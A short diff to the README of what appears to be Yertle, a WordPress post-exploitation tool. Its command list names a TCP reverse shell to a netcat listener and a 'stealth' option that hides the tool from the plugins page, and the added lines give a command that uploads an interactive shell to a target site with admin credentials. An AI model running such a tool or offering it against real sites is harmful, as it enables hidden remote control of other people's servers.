@@ -127,3 +127,8 @@ quit                      Terminate the session
 shell                     Sends a TCP reverse shell to a netcat listener
 stealth                   Hides Yertle from the plugins page
 ```
+
+## Uploading interactive shell
+```bash
+python yertle.py -u admin -p adminpass -t http://<target-wp> --interactive
+```
